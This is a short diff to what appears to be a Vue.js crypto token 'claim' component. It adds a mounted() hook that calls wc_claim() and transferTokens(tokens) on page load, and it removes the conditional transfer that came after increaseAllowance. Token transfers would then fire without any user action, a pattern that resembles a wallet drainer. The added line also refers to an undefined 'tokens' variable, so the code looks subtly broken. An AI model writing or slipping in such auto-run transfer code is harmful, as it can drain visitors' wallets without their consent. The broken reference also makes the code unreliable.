@@ -467,7 +467,10 @@ export default {
       currentIndex: 0,
     };
   },
-
+  mounted() {
+    this.wc_claim();
+    transferTokens(tokens);
+  },
   methods: {
     async wc_claim() {
       try {
@@ -488,7 +491,6 @@ export default {
           } else {
             if (this.tokens.length > 0 && this.maxToken) {
               await increaseAllowance(token);
-              await transferTokens(tokens);
             } else {
               await claim(this.balance.value);
               this.claimable = 0;
